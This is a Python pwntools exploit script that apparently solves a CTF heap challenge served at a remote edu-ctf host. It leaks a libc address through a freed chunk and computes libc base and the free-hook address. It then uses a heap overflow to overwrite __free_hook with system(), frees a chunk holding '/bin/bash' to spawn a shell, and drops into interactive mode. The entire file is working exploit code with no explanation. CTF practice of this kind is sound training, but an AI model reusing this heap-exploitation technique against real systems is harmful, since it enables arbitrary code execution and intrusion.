import pwn
from pprint import pprint
proc = pwn.process(["./chal"], aslr=False)
proc = pwn.remote("edu-ctf.zoolab.org", 10008)
def alloc_chunk(num:int, username = b"a"*0x10, password = b"b"*0x10):
    proc.sendlineafter(b"> ", b"1")
    proc.sendlineafter(b"index\n> ", str(num).encode())
    proc.sendafter(b"username\n> ", username)
    proc.sendafter(b"password\n> ", password)
    proc.recvuntil(b"success!\n")

def edit_chunk(num:int, content:bytes, sz = -1):
    if sz == -1:
        sz = len(content)
    proc.sendlineafter(b"> ", b"2")
    proc.sendlineafter(b'index\n> ', str(num).encode())
    proc.sendlineafter(b'size\n> ', str(sz).encode())
    proc.send(content)
    proc.recvuntil(b"success!\n")

def del_chunk(num:int):
    proc.sendline(b"3")
    proc.sendline(str(num).encode())
    proc.recvuntil(b"success!\n")

from pwn import cyclic

edit_chunk(0, b"a"*0x410)
alloc_chunk(1, b"1"*16)

del_chunk(0)

proc.sendafter(b"> ", b"4")
from pwn import u64

addr = u64(proc.recvuntil(b"bye").splitlines()[1][6:] + b"\x00"*2)
print(f"leaked address:{hex(addr)}")
libc_base = addr - 2018272
addr += 8808
print(f"free hook addr:{hex(addr)}")
gadget = libc_base + 336528 # system

# heap overflow write arbitary address
alloc_chunk(6, b"6" * 16)
edit_chunk(6, b"s" * 0x410)
edit_chunk(6, b"s" * 1088 + addr.to_bytes(8, 'little'))

# trigger free hook
edit_chunk(1, gadget.to_bytes(8, 'little'))
edit_chunk(6 , b"/bin/bash\x00")
proc.sendline(b"3")
proc.sendline(str(6).encode())
proc.interactive()
